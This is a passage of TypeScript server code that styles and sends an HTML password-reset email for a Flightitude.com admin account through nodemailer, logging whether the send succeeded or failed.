    .card { max-width: 520px; margin: 0 auto; background: #fff; border-radius: 16px; overflow: hidden; box-shadow: 0 4px 24px rgba(0,0,0,0.08); }
    .header { background: linear-gradient(135deg, #2563eb, #7c3aed); padding: 28px 32px; text-align: center; }
    .header h1 { color: #fff; margin: 0; font-size: 22px; }
    .body { padding: 32px; text-align: center; }
    .body p { color: #4b5563; font-size: 15px; line-height: 1.6; }
    .btn { display: inline-block; margin: 24px 0; background: linear-gradient(135deg, #2563eb, #7c3aed); color: #fff; text-decoration: none; padding: 14px 36px; border-radius: 50px; font-weight: 700; font-size: 15px; }
    .note { font-size: 12px; color: #9ca3af; margin-top: 16px; }
    .footer { background: #f9fafb; padding: 16px 32px; text-align: center; font-size: 12px; color: #9ca3af; border-top: 1px solid #e5e7eb; }
  </style>
</head>
<body>
  <div class="card">
    <div class="header"><h1>🔐 Reset Your Password</h1></div>
    <div class="body">
      <p>You requested a password reset for your Flightitude.com admin account.<br>Click the button below to set a new password. This link expires in <strong>1 hour</strong>.</p>
      <a href="${resetLink}" class="btn">Reset Password</a>
      <p class="note">If you didn't request this, you can safely ignore this email. Your password won't change.</p>
      <p class="note">Or copy this link: ${resetLink}</p>
    </div>
    <div class="footer">Flightitude.com · This link expires in 1 hour</div>
  </div>
</body>
</html>`;

  try {
    await transporter.sendMail({
      from: `"Flightitude.com Security" <${process.env.EMAIL_USER}>`,
      to: email,
      subject: "🔐 Reset Your Flightitude.com Password",
      html,
      text: `Reset your Flightitude.com password\n\nClick this link to reset your password (expires in 1 hour):\n${resetLink}\n\nIf you didn't request this, ignore this email.`,
    });
    log(`✅ Password reset email sent to ${email}`);
    return { success: true };
  } catch (error: any) {
    log(`❌ Password reset email failed: ${error.message}`);
    return { success: false, message: error.message };
  }
}
